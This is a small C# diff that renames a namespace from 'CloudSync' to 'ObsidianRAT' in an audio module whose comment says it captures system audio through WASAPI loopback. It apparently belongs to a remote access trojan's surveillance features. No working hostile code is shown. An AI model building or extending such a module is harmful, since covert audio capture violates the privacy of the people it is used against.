@@ -3,7 +3,7 @@ using System.Collections.Concurrent;
 using NAudio.CoreAudioApi;
 using NAudio.Wave;
 
-namespace CloudSync.Services.Modules.Stream.Sound
+namespace ObsidianRAT.Services.Modules.Stream.Sound
 {
     /// <summary>
     /// Captures system audio using WASAPI loopback (what you hear through speakers).
